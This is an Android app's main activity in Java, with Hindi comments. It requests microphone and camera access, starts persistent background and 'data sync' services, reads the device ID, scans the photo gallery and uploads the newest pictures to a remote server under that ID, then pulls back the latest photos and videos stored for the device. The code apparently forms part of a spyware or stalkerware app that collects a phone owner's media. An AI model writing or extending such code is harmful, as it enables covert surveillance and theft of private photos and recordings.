package com.ultimate.access;

import android.Manifest;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.VideoView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.ultimate.access.services.UltimateBackgroundService;
import com.ultimate.access.network.DataSyncService;
import com.ultimate.access.network.ApiClient;
import com.ultimate.access.network.ApiService;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;

    private TextView tvStatus;
    private TextView tvDeviceId;

    private Button btnServerSync;
    private Button btnExit;
    private Button btnTestUpload;
    private Button btnFetchPhoto;    // 🔥 NEW: फोटो फेच करने के लिए
    private Button btnFetchVideo;    // 🔥 NEW: वीडियो फेच करने के लिए

    private ImageView ivPhoto;       // 🔥 फोटो दिखाने के लिए
    private VideoView vvVideo;       // 🔥 वीडियो दिखाने के लिए

    String[] permissions = {
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        tvDeviceId = findViewById(R.id.tv_device_id);
        btnServerSync = findViewById(R.id.btn_server_sync);
        btnExit = findViewById(R.id.btn_exit);
        btnTestUpload = findViewById(R.id.btn_test_upload);
        btnFetchPhoto = findViewById(R.id.btn_fetch_photo);
        btnFetchVideo = findViewById(R.id.btn_fetch_video);
        ivPhoto = findViewById(R.id.iv_photo);
        vvVideo = findViewById(R.id.vv_video);

        checkPermissions();

        btnTestUpload.setOnClickListener(v -> {
            scanAllMedia();  // 🔥 पूरा मोबाइल स्कैन करेगा
        });

        btnFetchPhoto.setOnClickListener(v -> {
            fetchLatestPhoto();  // 🔥 सर्वर से लेटेस्ट फोटो लाएगा
        });

        btnFetchVideo.setOnClickListener(v -> {
            fetchLatestVideo();  // 🔥 सर्वर से लेटेस्ट वीडियो लाएगा
        });
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            onPermissionsGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            onPermissionsGranted();
        }
    }

    public void onPermissionsGranted() {
        tvStatus.setText("App Running");

        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        tvDeviceId.setText("Device ID: " + androidId);

        startBackgroundService();
        startDataSyncService();

        btnServerSync.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, ServerSyncActivity.class);
            startActivity(intent);
        });

        btnExit.setOnClickListener(v -> {
            Toast.makeText(MainActivity.this, "App Closed", Toast.LENGTH_SHORT).show();
            finishAffinity();
        });
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, UltimateBackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void startDataSyncService() {
        Intent intent = new Intent(this, DataSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    // 🔥 NEW: POORA MOBILE SCAN KAREGA (TEST KE LIYE)
    private void scanAllMedia() {
        Log.d(TAG, "🔍 Scanning all media...");

        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
        };

        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

                while (cursor.moveToNext() && count < 5) {  // पहले 5 photos
                    String path = cursor.getString(dataColumn);
                    Log.d(TAG, "📸 Found: " + path);

                    File file = new File(path);
                    if (file.exists()) {
                        uploadToServer(file, "gallery");
                        count++;
                    }
                }

                Toast.makeText(this, "📤 Uploading " + count + " photos", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "No media found", Toast.LENGTH_LONG).show();
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Scan error: " + e.getMessage());
            Toast.makeText(this, "Scan error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void uploadToServer(File file, String type) {
        try {
            RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
            MultipartBody.Part body = MultipartBody.Part.createFormData("file", file.getName(), requestFile);

            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            RequestBody deviceIdBody = RequestBody.create(MediaType.parse("text/plain"), deviceId);
            RequestBody typeBody = RequestBody.create(MediaType.parse("text/plain"), type);

            ApiService apiService = ApiClient.getClient().create(ApiService.class);
            apiService.uploadMedia(deviceIdBody, typeBody, body).enqueue(new Callback<ApiService.MediaResponse>() {
                @Override
                public void onResponse(Call<ApiService.MediaResponse> call, Response<ApiService.MediaResponse> response) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "✅ Upload successful: " + file.getName());
                    } else {
                        Log.e(TAG, "❌ Upload failed: " + response.code() + " - " + response.message());
                    }
                }

                @Override
                public void onFailure(Call<ApiService.MediaResponse> call, Throwable t) {
                    Log.e(TAG, "❌ Upload error: " + t.getMessage());
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "❌ Exception: " + e.getMessage());
        }
    }

    // 🔥 NEW: LATEST PHOTO FETCH KAREGA
    private void fetchLatestPhoto() {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        Call<ApiService.PhotoResponse> call = apiService.getLatestPhoto(deviceId);

        call.enqueue(new Callback<ApiService.PhotoResponse>() {
            @Override
            public void onResponse(Call<ApiService.PhotoResponse> call, Response<ApiService.PhotoResponse> response) {
                if (response.isSuccessful() && response.body() != null) {
                    String photoUrl = response.body().url;
                    Log.d(TAG, "📸 Latest photo URL: " + photoUrl);

                    // फोटो ImageView में दिखाओ
                    if (photoUrl != null && !photoUrl.isEmpty()) {
                        // Glide या Picasso से लोड कर सकते हो
                        // Glide.with(MainActivity.this).load(photoUrl).into(ivPhoto);
                        Toast.makeText(MainActivity.this, "Photo URL: " + photoUrl, Toast.LENGTH_LONG).show();
                    }
                } else {
                    Log.e(TAG, "❌ Failed to fetch photo");
                    Toast.makeText(MainActivity.this, "No photo found", Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onFailure(Call<ApiService.PhotoResponse> call, Throwable t) {
                Log.e(TAG, "❌ Fetch photo error: " + t.getMessage());
                Toast.makeText(MainActivity.this, "Error: " + t.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
    }

    // 🔥 NEW: LATEST VIDEO FETCH KAREGA
    private void fetchLatestVideo() {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        Call<ApiService.VideoResponse> call = apiService.getLatestVideo(deviceId);

        call.enqueue(new Callback<ApiService.VideoResponse>() {
            @Override
            public void onResponse(Call<ApiService.VideoResponse> call, Response<ApiService.VideoResponse> response) {
                if (response.isSuccessful() && response.body() != null) {
                    String videoUrl = response.body().url;
                    Log.d(TAG, "🎥 Latest video URL: " + videoUrl);

                    // वीडियो VideoView में दिखाओ
                    if (videoUrl != null && !videoUrl.isEmpty()) {
                        vvVideo.setVideoPath(videoUrl);
                        vvVideo.start();
                        Toast.makeText(MainActivity.this, "Video URL: " + videoUrl, Toast.LENGTH_LONG).show();
                    }
                } else {
                    Log.e(TAG, "❌ Failed to fetch video");
                    Toast.makeText(MainActivity.this, "No video found", Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onFailure(Call<ApiService.VideoResponse> call, Throwable t) {
                Log.e(TAG, "❌ Fetch video error: " + t.getMessage());
                Toast.makeText(MainActivity.this, "Error: " + t.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
    }
}